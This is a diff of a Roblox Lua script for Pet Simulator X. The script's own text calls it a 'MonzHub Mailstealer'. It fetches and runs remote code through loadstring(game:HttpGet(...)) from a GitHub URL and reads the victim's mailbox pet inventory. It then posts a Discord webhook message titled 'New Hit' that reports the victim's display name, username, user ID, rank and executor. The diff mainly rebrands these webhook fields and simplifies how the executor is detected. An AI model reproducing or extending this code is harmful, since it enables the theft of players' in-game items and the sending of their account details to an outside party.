@@ -43,7 +43,6 @@
     
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))()
 
---// Exclusive Info
 local Exclusive = 0
 
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
@@ -54,27 +53,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
             end
 	end
 
---// Executor detector
-
-local function getexploit()
-	local exploit =
-		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
-		(secure_load and "Sentinel") or
-		(is_sirhurt_closure and "Sirhurt") or
-		(pebc_execute and "ProtoSmasher") or
-		(KRNL_LOADED and "Krnl") or
-		(WrapGlobal and "WeAreDevs") or
-		(isvm and "Proxo") or
-		(shadow_env and "Shadow") or
-		(jit and "EasyExploits") or
-		(getscriptenvs and "Calamari") or
-		(unit and not syn and "Unit") or
-		(OXYGEN_LOADED and "Oxygen U") or
-		(IsElectron and "Electron") or
-		("Unsupported")
-  
-	return exploit
-  end
+local exploit = identifyexecutor()
   
 --// Execution Log
 if game.PlaceId == 6284583030 then
@@ -104,19 +83,19 @@ local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Funct
 local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
 local function sendwebhook(msg)
 local msg = {
-	["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1108811431404654592/images.png",
-	["content"]= "**🎁New Hit With Monz🎁** || @here|| ",
-	["username"] = "Monz",
+	["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1108811455408656404/Monzz.png",
+	["content"]= "**🎁New Hit With MonzHub🎁** || @here|| ",
+	["username"] = "MonzHub",
 	["embeds"]= {
 	  {
-		["title"]= "`Monz Mailstealer Results`",
-		["description"]= "**Data from the victim**\n```🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n☠Executor: "..exploit.."\n📮Receiver: ".._G.Username.."```",
-		["url"]= "https://discord.gg/d2X3XVm7",
+		["title"]= "`MonzHub Mailstealer Results`",
+		["description"]= "**Data from the victim**\n```🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n☠️Executor: "..exploit.."\n📮Receiver: ".._G.Username.."```",
+		["url"]= "https://discord.gg/ajmeAeq76d",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
-        ["url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1108821104853786785/cat.png",
+        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
         ["height"] = 420,
-        ["width"] = 420
+        ["width"] = 420,
         },
 		["fields"]= {
         {
